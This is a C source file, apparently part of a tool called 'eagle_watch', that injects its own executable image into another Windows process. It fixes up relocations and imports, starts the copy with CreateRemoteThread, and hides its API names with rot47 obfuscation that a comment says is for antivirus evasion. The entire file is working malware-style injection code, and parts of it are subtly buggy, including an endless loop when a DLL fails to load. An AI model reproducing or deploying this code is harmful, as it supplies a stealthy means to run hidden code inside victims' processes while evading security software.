/* 
 * eagle_watch injection module
 * 	process injection functions and etcness....
 *		+base relocation fix
 *		+iat fix
 */

#include <windows.h>

void save_pristine();
BOOL inject_self(DWORD target_pid, LPTHREAD_START_ROUTINE thread_startproc, LPVOID thread_params);
void fix_iat();
HMODULE get_hmodule();
BOOL is_injected();


HMODULE h_module;
LPVOID image_save;
DWORD image_size;
BOOL b_injected;		/* will be FALSE in the parent process and TRUE in the injected process */


FARPROC p_CreateRemoteThread, p_OpenProcess, p_WriteProcessMemory, p_VirtualAllocEx;
BOOL is_strdec = FALSE;

/* Function decrypts rot47'd GetProcAddress strings (AV evasion) */
void decrypt_and_load_libs(){
	
	char *f_names[] = {	"z6C?6=ba]5==",			/*Kernel32.dll*/
						"':CEF2=p==@4tI",		/*VirtualAllocEx*/
						"rC62E6#6>@E6%9C625",	/*CreateRemoteThread*/
						"~A6?!C@46DD",			/*OpenProcess*/
						"(C:E6!C@46DD|6>@CJ"};	/*WriteProcessMemory*/
	HMODULE h_dll;
	int i;
	
	if( is_strdec )
		return;
		
	
	/* decrypt strings */
	for(i=0; i<5; i++)
		rot47(f_names[i]);
	
	h_dll = LoadLibrary(f_names[0]);
	
	p_VirtualAllocEx = (FARPROC)GetProcAddress(h_dll, f_names[1]);
	p_CreateRemoteThread = (FARPROC)GetProcAddress(h_dll, f_names[2]);
	p_OpenProcess = (FARPROC)GetProcAddress(h_dll, f_names[3]);
	p_WriteProcessMemory = (FARPROC)GetProcAddress(h_dll, f_names[4]);
	
	is_strdec = TRUE;
}
	
	
	
/* 
 * Function copies the entire pe image of the current module to a  VirtualAlloc'ed memory
 * in the current process to save the 'pristine' state of the current module
 * (before CRT has been initted) 
 */
void save_pristine(){

	HANDLE h_process;
	PIMAGE_DOS_HEADER p_image_dos_header;
	PIMAGE_OPTIONAL_HEADER32 p_img_optional_header;
	
	decrypt_and_load_libs();
	
	
	h_module = GetModuleHandle(0);
	b_injected = FALSE;

	p_image_dos_header= (PIMAGE_DOS_HEADER)h_module;
	p_img_optional_header = (PIMAGE_OPTIONAL_HEADER32)((DWORD)h_module + 
														p_image_dos_header->e_lfanew + 
														sizeof(DWORD) + 
														sizeof(IMAGE_FILE_HEADER));	
	image_size = p_img_optional_header->SizeOfImage;
	
	h_process = (HANDLE)p_OpenProcess(PROCESS_VM_OPERATION  | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());
	image_save = (LPVOID)p_VirtualAllocEx(h_process, NULL, image_size, MEM_COMMIT, PAGE_READWRITE);
	p_WriteProcessMemory(h_process, image_save, h_module, image_size, NULL);
	
}



/* Function injects the current module into the process specified by target_pid.
 * Additionally, base relocations are performed.
 * CreateRemoteThread is called to start execution of a thread in the remote process
 * @@param target_pid -> pid of the target process, where the image will be injected
 */
BOOL inject_self(DWORD target_pid, LPTHREAD_START_ROUTINE thread_startproc, LPVOID thread_params){
	
	PIMAGE_BASE_RELOCATION base_reloc_blk, next_reloc_blk;
	WORD *reloc_record;
	DWORD *fix_location;
	
	HANDLE h_process;
	LPVOID r_mem;				/* holds address of the remote alloc'ed memory */
	PIMAGE_DOS_HEADER p_image_dos_header;
	PIMAGE_OPTIONAL_HEADER32 p_img_optional_header;
	
	LPTHREAD_START_ROUTINE start_proc;
	
	decrypt_and_load_libs();
	
	
	p_image_dos_header= (PIMAGE_DOS_HEADER)h_module;
	p_img_optional_header = (PIMAGE_OPTIONAL_HEADER32)((DWORD)h_module + 
														p_image_dos_header->e_lfanew + 
														sizeof(DWORD) + 
														sizeof(IMAGE_FILE_HEADER));
	
	/* Allocate Memory in the remote process */
	h_process = (HANDLE)p_OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION  | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_PROCESS , FALSE, target_pid);
	if(!h_process)
		return FALSE;
	
	r_mem = (LPVOID)p_VirtualAllocEx(h_process, NULL, image_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(!r_mem)
		return FALSE;
	
	
	/* Perform Base Relocations (in the image_save i.e copy of the current process)
	 * -thanx to dengus from codeproject for this
	 * check http://msdn.microsoft.com/en-us/library/ms809762.aspx
	 */
	 
	/* get location of '.reloc' or RELOCATION records */
	base_reloc_blk = (PIMAGE_BASE_RELOCATION)(p_img_optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + (DWORD)h_module);
	
	if(base_reloc_blk){
	
		/* Iterate though RELOC record BLOCKS */
		while(base_reloc_blk->VirtualAddress){
			
			next_reloc_blk = (PIMAGE_BASE_RELOCATION)((DWORD)base_reloc_blk + base_reloc_blk->SizeOfBlock);	/* calculate addr of next relocation record block */
			reloc_record = (WORD *)((DWORD)base_reloc_blk + sizeof(DWORD)*2);								/* fetch the first relocation record in the current block */
			
			while((DWORD)reloc_record < (DWORD)next_reloc_blk){
				
				/* fix relocation record */
				if ( *reloc_record >> 12 == IMAGE_REL_BASED_HIGHLOW ){
					
					/* calculate the location in the image_save where the fix is to be made prior to copy 
						(note we make changes in the copy `image_save` and not the current image)
					*/
					fix_location = (DWORD *)(base_reloc_blk->VirtualAddress + (*reloc_record & 0xFFF));	
					fix_location = (DWORD *)((DWORD)fix_location  + (DWORD)image_save);
					
					
					
					/* perform fix i.e add DELTA between current base_of_image and new_base_of_image pointed to by r_mem */
					*fix_location += (BYTE *)r_mem - (BYTE *)h_module;
					
				}
				reloc_record++;					/* goto the next record in the current block */
			}
			
			base_reloc_blk = next_reloc_blk;	/* goto the next relocation record block */
		}

	}
	

	/* Change value of h_module in image_save to point to r_mem */
	*( (DWORD *) ((DWORD)&h_module - (DWORD)h_module + (DWORD)image_save) ) = (DWORD)r_mem;
	
	/* Change value of b_injected in image_save to point to TRUE */
	*( (BOOL *) ((DWORD)&b_injected - (DWORD)h_module + (DWORD)image_save) ) = (BOOL)TRUE;
	
	/* Write image_save to the remote alloc'ed memory */
	if(! p_WriteProcessMemory(h_process, r_mem, image_save, image_size, NULL) )
		return FALSE;
	
	/* Create Remote Thread !!! */
	start_proc = (LPTHREAD_START_ROUTINE)( ((DWORD)thread_startproc - (DWORD)h_module) + (DWORD)r_mem );	/* calculate offset of start_proc */
	if(! p_CreateRemoteThread(h_process, 0, 0, start_proc, thread_params, 0, NULL) )
		return FALSE;
	
	return TRUE;
}




/* IAT fixer
 * Walks the import chain and fixes the imports
 * (call from the injected module)
 *  -thanks to dengus @codeproject
 */
void fix_iat(){
	
	PIMAGE_DOS_HEADER p_image_dos_header;
	PIMAGE_OPTIONAL_HEADER32 p_img_optional_header;
	
	PIMAGE_IMPORT_DESCRIPTOR p_img_import_desc;
	PIMAGE_THUNK_DATA32 p_first_thunk, p_orig_first_thunk;
	HMODULE h_dll;
	FARPROC far_proc;
	
	decrypt_and_load_libs();
	
	
	p_image_dos_header= (PIMAGE_DOS_HEADER)h_module;
	p_img_optional_header = (PIMAGE_OPTIONAL_HEADER32)((DWORD)h_module + 
														p_image_dos_header->e_lfanew + 
														sizeof(DWORD) + 
														sizeof(IMAGE_FILE_HEADER));
							
	/* get import directory (IAT) */
	p_img_import_desc =  (PIMAGE_IMPORT_DESCRIPTOR) (p_img_optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (DWORD)h_module);
	
	
	/* iterate through imports, one dll at a time */
	while( p_img_import_desc->Characteristics ){
		
		/* Load DLL */
		h_dll = LoadLibraryA((LPCSTR)((DWORD)h_module + p_img_import_desc->Name));
		if(!h_dll)
			continue;	/* Skip on module load fail */
		
		
		p_orig_first_thunk = (PIMAGE_THUNK_DATA32) (p_img_import_desc->OriginalFirstThunk + (DWORD) h_module);
		p_first_thunk = (PIMAGE_THUNK_DATA32) (p_img_import_desc->FirstThunk + (DWORD) h_module);
		
		
		/* Iterate through imports in OriginalFirstThunk, get the corresponding addresses to the imported functions
		 * and fix the corresponding address-values in FirstThunk
		 */
		while( p_orig_first_thunk->u1.AddressOfData ){
			
			/* If imported by ordinal */
			if( p_orig_first_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 )
				far_proc = GetProcAddress(h_dll, (LPCSTR) (p_orig_first_thunk->u1.Ordinal & 0xFFFF));
			
			/* If imported by name */
			else
				far_proc = GetProcAddress(h_dll, (LPCSTR) ((DWORD)h_module + p_orig_first_thunk->u1.AddressOfData + 2));
			
			
			/* Store the corrected address in the FirstThunk chain */
			if(far_proc)
				(FARPROC) p_first_thunk->u1.AddressOfData = far_proc;
			
			p_first_thunk++;
			p_orig_first_thunk++;
		}
		
		p_img_import_desc++;
	}
}


HMODULE get_hmodule(){
	return h_module;
}


/* returns true for the injected process */
BOOL is_injected(){
	
	return b_injected ? TRUE : FALSE;

}



